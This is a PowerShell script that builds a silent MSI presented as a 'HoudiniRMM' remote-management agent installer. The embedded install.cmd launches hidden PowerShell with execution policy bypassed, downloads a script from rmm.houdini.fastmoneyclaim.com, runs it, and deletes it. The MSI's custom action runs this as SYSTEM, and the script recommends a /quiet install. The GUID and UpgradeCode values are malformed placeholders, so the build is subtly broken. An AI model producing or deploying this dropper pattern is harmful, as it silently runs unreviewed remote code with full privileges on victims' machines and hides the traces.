<#
.SYNOPSIS
    Build a silent MSI installer for the HoudiniRMM agent.
.DESCRIPTION
    Creates an MSI package that runs the RMM install script silently.
    Requires WiX Toolset (wix.exe) to be installed.
    Download from: https://wixtoolset.org/releases/
.PARAMETER OutDir
    Directory where the MSI will be saved. Default: current directory.
.PARAMETER ProductName
    Name of the product. Default: "HoudiniRMM".
.PARAMETER ProductVersion
    Version number. Default: "1.0.0".
#>

param(
    [string]$OutDir = ".",
    [string]$ProductName = "HoudiniRMM",
    [string]$ProductVersion = "1.0.0",
    [string]$Manufacturer = "HoudiniRMM"
)

#region [CHECK WIX]
$wixPath = Get-ChildItem -Path "C:\Program Files (x86)\WiX Toolset v*", "C:\Program Files\WiX Toolset v*" -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $wixPath) {
    Write-Host "WiX Toolset not found. Download and install from:" -ForegroundColor Red
    Write-Host "https://wixtoolset.org/releases/" -ForegroundColor Yellow
    exit 1
}
$candle = Join-Path $wixPath.FullName "bin\candle.exe"
$light = Join-Path $wixPath.FullName "bin\light.exe"
if (-not (Test-Path $candle) -or -not (Test-Path $light)) {
    Write-Host "candle.exe or light.exe not found in $($wixPath.FullName)" -ForegroundColor Red
    exit 1
}
Write-Host "Found WiX at: $($wixPath.FullName)" -ForegroundColor Green
#endregion

#region [CREATE TEMP DIR]
$tempDir = Join-Path $env:TEMP "rmm-msi-build"
if (Test-Path $tempDir) { Remove-Item -Recurse -Force $tempDir }
New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
#endregion

#region [GENERATE INSTALL SCRIPT]
$installScript = @'
@echo off
setlocal enabledelayedexpansion
echo Installing HoudiniRMM agent...
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -UseBasicParsing 'https://rmm.houdini.fastmoneyclaim.com/dashboard/api/install-script' -OutFile $env:TEMP\install.ps1; & $env:TEMP\install.ps1 }"
timeout /t 3 /nobreak >nul
if exist "%TEMP%\install.ps1" del /q "%TEMP%\install.ps1"
'@

$scriptPath = Join-Path $tempDir "install.cmd"
Set-Content -Path $scriptPath -Value $installScript -Encoding ASCII
#endregion

#region [CREATE MSI WXS FILE]
$wxs = @"
<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Product Id="*"
             UpgradeCode="HOUDINI-RMM-UPGRADE-CODE-12345"
             Name="$ProductName Agent Installer"
             Version="$ProductVersion"
             Manufacturer="$Manufacturer"
             Language="1033">
        <Package InstallerVersion="200"
                 Compressed="yes"
                 InstallScope="perMachine"
                 Manufacturer="$Manufacturer"
                 Platform="x64"/>
        <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
        <CustomAction Id="RunInstallCmd"
                      FileKey="install.cmd"
                      ExeCommand=""
                      Execute="deferred"
                      Impersonate="no"
                      Return="ignore"/>
        <InstallExecuteSequence>
            <Custom Action="RunInstallCmd" After="InstallFiles"/>
        </InstallExecuteSequence>
        <Directory Id="TARGETDIR" Name="SourceDir">
            <Directory Id="TempFolder">
                <Component Id="InstallScript" Guid="HOUDINI-INSTALL-SCRIPT-GUID-12345">
                    <File Id="install.cmd"
                          Name="install.cmd"
                          Source="$scriptPath"
                          KeyPath="yes"
                          Vital="yes"/>
                    <RemoveFile Id="RemoveInstallScript" Name="install.cmd" On="uninstall"/>
                </Component>
            </Directory>
        </Directory>
        <Feature Id="MainFeature" Title="HoudiniRMM Agent" Level="1">
            <ComponentRef Id="InstallScript"/>
        </Feature>
    </Product>
</Wix>
"@

$wxsPath = Join-Path $tempDir "installer.wxs"
Set-Content -Path $wxsPath -Value $wxs -Encoding UTF8
#endregion

#region [COMPILE WITH WIX]
$objDir = Join-Path $tempDir "obj"
New-Item -ItemType Directory -Force -Path $objDir | Out-Null
$msiFile = Join-Path $OutDir "$($ProductName)-Agent-Installer-$ProductVersion.msi"

Write-Host "Compiling with WiX..." -ForegroundColor Cyan
$candleProcess = Start-Process -FilePath $candle -ArgumentList "-out",(Join-Path $objDir "installer.wixobj"),$wxsPath -Wait -PassThru -NoNewWindow
if ($candleProcess.ExitCode -ne 0) {
    Write-Host "Candle failed. Exit code: $($candleProcess.ExitCode)" -ForegroundColor Red
    exit 1
}
$lightProcess = Start-Process -FilePath $light -ArgumentList "-out",$msiFile,"-ext","WixUIExtension",(Join-Path $objDir "installer.wixobj") -Wait -PassThru -NoNewWindow
if ($lightProcess.ExitCode -ne 0) {
    Write-Host "Light failed. Exit code: $($lightProcess.ExitCode)" -ForegroundColor Red
    exit 1
}
#endregion

#region [CLEANUP & OUTPUT]
if (Test-Path $tempDir) { Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue }
Write-Host "MSI built: $msiFile" -ForegroundColor Green
Write-Host "Use: msiexec /i `"$msiFile`" /quiet /norestart" -ForegroundColor Gray
#endregion